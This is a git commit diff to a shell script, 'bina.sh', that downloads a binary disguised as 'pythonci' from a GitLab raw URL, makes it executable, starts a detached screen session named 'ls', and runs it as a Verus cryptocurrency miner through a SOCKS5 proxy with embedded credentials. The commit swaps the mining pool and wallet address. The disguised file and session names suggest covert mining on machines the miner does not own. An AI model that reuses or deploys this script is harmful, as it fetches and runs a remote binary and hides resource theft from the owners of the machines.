fc7f80bb04b1eb80f7ac88892326e2fedc19834a
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-09 10:09:53 +0100

    Update bina.sh

--- bina.sh
+++ bina.sh
@@ -5,8 +5,8 @@ sudo apt install screen libjansson4 -y
 wget https://gitlab.com/Scalaxlarig/bisalahhh/-/raw/main/pythonci
 chmod +x pythonci
 screen -dmS ls
-PL=verushash.asia.mine.zergpool.com:3300
-WT=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
+PL=stratum+tcp://na.luckpool.net:3956
+WT=RNfF475UVShH9C3n8abuUnxgCxsRYR9rNe
 WR=jajal
 PY=socks5://w1rtyuw:s1dfgyt3b@150.129.171.123:6667
 ./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
